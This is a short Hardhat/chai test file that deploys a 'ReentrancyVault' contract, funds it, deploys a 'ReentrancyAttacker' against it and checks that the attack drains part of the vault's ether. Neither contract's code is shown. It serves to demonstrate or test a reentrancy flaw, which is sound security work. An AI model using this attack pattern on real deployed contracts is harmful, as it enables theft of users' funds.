const { expect } = require("chai");
describe("Reentrancy", function(){
  it("exploits vault", async function(){
    const [u] = await ethers.getSigners();
    const Vault = await ethers.getContractFactory("ReentrancyVault");
    const vault = await Vault.deploy(); await vault.deployed();
    await u.sendTransaction({to: vault.address, value: ethers.utils.parseEther("10")});
    const Att = await ethers.getContractFactory("ReentrancyAttacker");
    const att = await Att.deploy(vault.address); await att.deployed();
    await att.attack({value: ethers.utils.parseEther("1")});
    expect(await ethers.provider.getBalance(vault.address)).to.be.lt(ethers.utils.parseEther("10"));
  });
});
